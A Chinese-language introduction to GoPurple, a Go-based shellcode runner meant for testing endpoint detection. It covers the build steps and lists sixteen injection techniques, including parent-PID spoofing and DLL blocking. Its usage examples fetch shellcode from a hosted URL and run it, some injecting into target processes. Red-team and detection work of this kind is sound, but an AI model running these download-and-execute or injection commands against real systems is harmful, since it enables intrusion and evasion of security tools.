![](https://image.3001.net/images/20210915/1631679927_614175b72bfdc767cbe8f.jpg!small)

## 关于GoPurple

 **GoPurple是一款功能强大的Shellcode运行工具**
，该工具基于Golang开发。GoPurple由多种不同的技术结合实现，其中包括了大量Shellcode注入技术。
**GoPurple可以帮助广大研究人员更好地评估终端安全解决方案的检测能力。**

## 工具要求

由于GoPurple项目基于Golang开发，因此我们首先需要在本地设备上安装并配置好[
_Go_](https://golang.org/dl/)语言环境。

## 工具安装

首先，我们需要使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/sh4hin/GoPurple.git

接下来，打开命令行终端，并切换到该项目根目录下，然后运行下列命令：

    
    
    go build

如果构建系统不是Windows系统的话，别忘了设置“GOOS=windows”。

构建完成后，你将会看到如下所示的界面：

    
    
    _____                              _
    
      / ____|                            | |
    
     | |  __  ___  _ __  _   _ _ __ _ __ | | ___
    
     | | |_ |/ _ \| '_ \| | | | '__| '_ \| |/ _ \
    
     | |__| | (_) | |_) | |_| | |  | |_) | |  __/
    
      \_____|\___/| .__/ \__,_|_|  | .__/|_|\___|
    
                  | |              | |
    
                  |_|              |_|   by @s3cdev
    
     
    
     -a string
    
            Program command line arguments
    
      -b string
    
            block DLL mode (nonms/onlystore for QueueUserAPC )
    
      -p int
    
            Process ID to inject shellcode into
    
      -prog string
    
            program to inject into
    
      -t string
    
            shellcode injection technique to use:
    
             1: CreateFiber
    
             2: syscall
    
             3: CreateThreadNative
    
             4: CreateProcess
    
             5: EtwpCreateEtwThread
    
             6: CreateRemoteThread
    
             7: RtlCreateUserThread
    
             8: CreateThread
    
             9: CreateRemoteThreadNative
    
             10: CreateProcessWithPipe
    
             11: QueueUserAPC
    
             12: CreateThreadpoolWait
    
             13: BananaPhone
    
             14: EnumerateLoadedModules
    
             15: EnumChildWindows
    
             16: EnumPageFilesW
    
      -u string
    
            URL hosting the shellcode

## 工具使用介绍

在使用GoPurple之前，我们需要使用类似[ _msfvenom_](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)或[
_shad0w_](https://github.com/bats3c/shad0w)之类的工具来生成一份Shellcode。接下来，生成的Shellcode需要托管在服务器系统中以供远程下载，然后将其下载至远程设备上。

 **下面给出的是该工具的三种使用方式：**

> 基于BananaPhone方法 + Shad0w（Shellcode生成器）实现的Shellcode注入。
>
> 基于QueueUserAPC技术 + Shad0w（Shellcode生成器）+ 父进程ID欺骗 + 启动包含Shellcode的进程（exe） +
> 保护进程（防止未签名的DLL钩子）实现的Shellcode注入。
>
> 使用CreateFiber + msfvenom（Shellcode生成器）实现的Shellcode注入。

## 工具使用样例

    
    
    1 - gopurple.exe -u urlhostingpayload -t 1 (CreateFiber)
    2 - gopurple.exe -u urlhostingpayload -t 2 (Syscall)
    3 - gopurple.exe -u urlhostingpayload -t 3 (CreateThreadNative)
    4 - gopurple.exe -u urlhostingpayload -t 4 (CreateProcess)
    5 - gopurple.exe -u urlhostingpayload -t 5 (EtwpCreateEtwThread)
    6 - gopurple.exe -u urlhostingpayload -t 6 -p targetprocess (CreateRemoteThread)
    7 - gopurple.exe -u urlhostingpayload -t 7 -p targetprocess (RtlCreateUserThread)
    8 - gopurple.exe -u urlhostingpayload -t 8 (CreateThread)
    9 - gopurple.exe -u urlhostingpayload -t 9 -p targetprocess (CreateRemoteThreadNative)
    10 - gopurple.exe -u urlhostingpayload -t 10 -prog porgram -a processargument (ex:C:\Windows\System32\WindowsPowerShell\v1.0) and processargument(ex:Get-Process)  (CreateProcessWithPipe)
    11 - gopurple.exe -u urlhostingpayload -t 11 -p targetpidasparentprocess -prog programtoinjectshellcodeinto -b methodtoblockdll(nonms or onlystore)  (QueueUserAPC)
    nonms = only DLLs that are signed by Microsoft can hook into the process
    onlystore = only Microsoft store application's process can hook into the process
    12 - gopurple.exe -u urlhostingpayload -t 12 (CreateThreadpoolWait)
    13 - gopurple.exe -u urlhostingpayload -t 13 (BananaPhone)
    14-  gopurple.exe -u urlhostingpayload -t 14 (EnumerateLoadedModules)
    15-  gopurple.exe -u urlhostingpayload -t 15 (EnumChildWindows)
    16-  gopurple.exe -u urlhostingpayload -t 16 (EnumPageFilesW)

## 项目地址

 **GoPurple：** 【[ _GitHub传送门_](https://github.com/sh4hin/GoPurple)】

## 参考资料

> [ _https://github.com/Ne0nd0g/go-shellcode_](https://github.com/Ne0nd0g/go-> shellcode)
>
> [ _https://www.ired.team/_](https://www.ired.team/)
>
> [
> _https://github.com/D00MFist/Go4aRun﻿_](https://github.com/D00MFist/Go4aRun)
>
> [
> _https://github.com/BishopFox/sliver_](https://github.com/BishopFox/sliver)
>
> [ _https://posts.specterops.io/going-4-a-run-> eb263838b944_](https://posts.specterops.io/going-4-a-run-eb263838b944)
>
> [
> _https://github.com/C-Sto/BananaPhone_](https://github.com/C-Sto/BananaPhone)
>
> [ _https://blog.xpnsec.com/protecting-your-> malware_](https://blog.xpnsec.com/protecting-your-malware)
>
> [
> _https://github.com/3xpl01tc0d3r/ProcessInjection_](https://github.com/3xpl01tc0d3r/ProcessInjection)
>
> [
> _https://github.com/S4R1N/AlternativeShellcodeExec﻿_](https://github.com/S4R1N/AlternativeShellcodeExec)

